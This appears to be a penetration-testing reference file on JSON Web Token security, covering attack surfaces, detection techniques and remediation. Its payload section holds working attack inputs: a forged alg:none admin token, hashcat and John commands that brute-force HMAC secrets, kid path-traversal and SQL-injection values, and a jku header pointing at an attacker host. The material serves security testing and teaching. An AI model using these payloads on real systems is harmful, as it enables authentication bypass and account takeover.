---
name: jwt
description: JSON Web Token security assessment techniques
---

# JWT Security

## Attack Surface

- Algorithm confusion: RS256 to HS256 downgrade
- `alg: "none"` bypass (signature stripping)
- Weak HMAC secrets vulnerable to brute force
- Missing expiration (`exp`) or not-before (`nbf`) validation
- Sensitive data stored in unencrypted payload
- JWK/JWKS injection via `jku` or `jwk` header parameters
- Key ID (`kid`) parameter injection (SQLi, path traversal)
- Token not invalidated on logout or password change

## Detection Techniques

- Decode token payload (Base64) and inspect claims and headers
- Test `alg: "none"` with empty signature
- Test algorithm switching: change RS256 to HS256 using public key as secret
- Brute force weak HMAC secrets with wordlists
- Modify payload claims (role, user_id) and re-sign with discovered secret
- Check if expired tokens are still accepted
- Test `kid` parameter for injection: `"kid": "../../dev/null"`
- Verify token is invalidated after password change

## Common Payloads

### Algorithm None Attack
```
Header: {"alg": "none", "typ": "JWT"}
Payload: {"sub": "admin", "role": "admin"}
Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.
```

### HMAC Secret Brute Force
```bash
hashcat -a 0 -m 16500 jwt.txt wordlist.txt
john jwt.txt --wordlist=wordlist.txt --format=HMAC-SHA256
```

### Key ID Injection
```json
{"alg": "HS256", "typ": "JWT", "kid": "/dev/null"}
(sign with empty string as secret)
```

```json
{"alg": "HS256", "typ": "JWT", "kid": "' UNION SELECT 'known-secret' -- "}
```

### JKU/X5U Header Injection
```json
{"alg": "RS256", "jku": "https://attacker.com/.well-known/jwks.json"}
```

### Claim Tampering (after secret recovery)
```json
{"sub": "1002", "role": "admin", "exp": 9999999999}
```

## Remediation

- Explicitly specify and validate the expected algorithm server-side; reject `none`
- Use strong, randomly generated secrets for HMAC (256+ bits)
- Prefer asymmetric algorithms (RS256, ES256) for distributed systems
- Always validate `exp`, `nbf`, and `iss` claims
- Do not store sensitive data in JWT payload (it is only Base64-encoded, not encrypted)
- Sanitize `kid` parameter; never use it in file paths or queries
- Ignore `jku`/`jwk`/`x5u` headers or allowlist trusted URLs
- Implement token revocation (blacklist or short expiry + refresh tokens)

## References

- [JWT.io Debugger](https://jwt.io/)
- [PortSwigger JWT Attacks](https://portswigger.net/web-security/jwt)
- [RFC 7519](https://datatracker.ietf.org/doc/html/rfc7519)
- [jwt_tool](https://github.com/ticarpi/jwt_tool)
